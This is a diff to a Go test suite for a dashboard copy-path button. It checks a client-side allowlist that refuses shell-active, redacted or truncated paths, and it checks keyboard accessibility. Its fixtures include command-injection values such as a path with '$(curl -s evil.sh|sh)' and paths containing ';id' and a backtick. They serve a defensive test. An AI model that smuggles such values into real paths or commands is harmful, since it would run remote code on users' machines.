@@ -272,6 +272,12 @@ func TestHandleDashboard_CopyButtonLabelsRebase(t *testing.T) {
 // escape a newline in an attribute value, so one would ride the clipboard into a
 // terminal as a command terminator. buildEvent strips them on the way in, which
 // is what this exercises end to end.
+//
+// Only the control characters are stripped — the pipe survives into the
+// attribute, deliberately, because | is legal in a directory name and removing
+// it would corrupt a real path. Nothing shell-active is ever copied all the
+// same: the client's allowlist refuses the whole value (see
+// TestDashboardCopyGuard_PathAllowlist, which pins this exact string).
 func TestHandleDashboard_CwdControlCharsNeverReachTheAttribute(t *testing.T) {
 	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
 	defer db.Close()
@@ -356,15 +362,117 @@ func TestHandleDashboard_RedactedCwdIsRefusedByTheCopyGuard(t *testing.T) {
 		t.Errorf("the redacted cwd should still render (the row is worth showing):\n%s", body)
 	}
 	// The refusal itself lives in the client, so what the server can assert is
-	// that the guard is shipped and wired into the click handler.
+	// that the guard is shipped and wired into the click handler. All three
+	// branches are pinned, not just the one this row exercises: a simplification
+	// that dropped the ellipsis disjunct would let a truncated path be copied as
+	// a broken path with the suite still green. So are the three messages —
+	// their whole point is that each cause is described accurately.
 	for _, frag := range []string{
-		`function unusable(s) {`,
-		`s.indexOf('` + redacted + `') !== -1`,
-		`if (unusable(path)) {`,
-		`flash(btn, false, 'path was redacted — not copied');`,
+		`function unusableReason(s) {`,
+		`if (s.indexOf('` + redacted + `') !== -1) return 'redacted';`,
+		`if (s.charAt(s.length - 1) === '…') return 'truncated';`,
+		`if (pathAllow.test(s)) return 'unsafe';`,
+		`var why = unusableReason(path);`,
+		`flash(btn, false, unusableMsg[why]);`,
+		`redacted: 'part of this path was redacted — not copied',`,
+		`truncated: 'this path was too long and got cut off — not copied',`,
+		`unsafe: 'this path contains shell characters — not copied'`,
 	} {
 		if !strings.Contains(body, frag) {
 			t.Errorf("copy guard fragment missing from the page: %s", frag)
+		}
+	}
+}
+
+// pathAllowJS is the copy guard's allowlist exactly as it appears inside
+// new RegExp('…') in dashboard.html, and pathAllowGo is the same pattern with
+// the JS string escaping undone. Go's regexp gives \p{L}/\p{M}/\p{N} the same
+// meaning JS does under /u, so compiling it here exercises the real character
+// class. Asserting the JS form is present in the page keeps the two in step: a
+// change to the template that this test does not follow fails it.
+const pathAllowJS = `[^-\\p{L}\\p{M}\\p{N} /._+=,:@~%]`
+
+var pathAllowGo = regexp.MustCompile(strings.ReplaceAll(pathAllowJS, `\\`, `\`))
+
+// The allowlist has to refuse everything a shell would act on, and it has to
+// stay out of the way of ordinary paths. The second half matters as much as the
+// first: refusing spaces or non-ASCII names would make the button useless on a
+// Mac or on anyone's non-English filesystem, which is a worse outcome than the
+// attack it defends against.
+func TestDashboardCopyGuard_PathAllowlist(t *testing.T) {
+	safe := []string{
+		"/home/me/wt/fix-71",
+		"/Users/me/Library/Application Support/Claude",      // spaces are ordinary
+		"/home/mé/Ünïcode/プロジェクト/仕事",                        // non-ASCII letters must copy
+		"/home/me/Δοκιμή/проект/מסמכים",                     // more scripts, incl. RTL
+		"/home/me/v1.2+build=3,rev:4@host~tmp/100%_done-ok", // every permitted punctuation mark
+		"/",
+	}
+	for _, p := range safe {
+		if pathAllowGo.MatchString(p) {
+			t.Errorf("allowlist refuses an ordinary path: %q (offending char %q)",
+				p, pathAllowGo.FindString(p))
+		}
+	}
+
+	unsafe := map[string]string{
+		"command substitution": "/home/me/proj$(curl -s evil.sh|sh)",
+		"backtick":             "/home/me/proj`id`",
+		"semicolon":            "/home/me/proj;id",
+		"pipe":                 "/home/me/wtcurl evil.sh|sh",
+		"ampersand":            "/home/me/proj&id",
+		"redirect out":         "/home/me/proj>out",
+		"redirect in":          "/home/me/proj<in",
+		"double quote":         `/home/me/pro"j`,
+		"single quote":         "/home/me/pro'j",
+		"backslash":            `/home/me/pro\j`,
+		"glob star":            "/home/me/proj*",
+		"glob question":        "/home/me/proj?",
+		"bracket":              "/home/me/pro[j]",
+		"brace":                "/home/me/pro{j}",
+		"history bang":         "/home/me/proj!",
+		"comment hash":         "/home/me/proj#x",
+		"newline":              "/home/me/proj\nid",
+	}
+	for name, p := range unsafe {
+		if !pathAllowGo.MatchString(p) {
+			t.Errorf("allowlist permits a shell-active path (%s): %q", name, p)
+		}
+	}
+}
+
+// The pattern the test above exercises must be the one the page actually ships.
+func TestHandleDashboard_ShipsThePathAllowlist(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	body := getBody(t, db, "/")
+	if !strings.Contains(body, `new RegExp('`+pathAllowJS+`', 'u')`) {
+		t.Errorf("the page does not ship the allowlist this suite tests: %s", pathAllowJS)
+	}
+}
+
+// Two ways the copy button can fail a keyboard user, both of which cost nothing
+// to keep pinned. The drag-selection guard must not run on keyboard activation
+// (Enter does not collapse a selection made earlier elsewhere, so a
+// document-wide guard would swallow the copy with no flash and no
+// announcement), and the poller must carry focus across its #content swap
+// rather than drop it to <body> mid-interaction.
+func TestHandleDashboard_CopyButtonSurvivesKeyboardUseAndRefresh(t *testing.T) {
+	db, _ := openDB(filepath.Join(t.TempDir(), "events.db"))
+	defer db.Close()
+	body := getBody(t, db, "/")
+	for _, frag := range []string{
+		`if (ev.detail !== 0) {`,
+		`sel.containsNode(btn, true)`,
+		`function swapContent(html) {`,
+		`active.closest('#content .copycwd')`,
+		`if (btns[i].getAttribute('data-cwd') === key) { btns[i].focus(); return; }`,
+		`document.dispatchEvent(new CustomEvent('ch:contentswap'))`,
+		`document.addEventListener('ch:contentswap', unflash);`,
+		`swapContent(d.html);`,
+	} {
+		if !strings.Contains(body, frag) {
+			t.Errorf("copy-button a11y fragment missing from the page: %s", frag)
 		}
 	}
 }
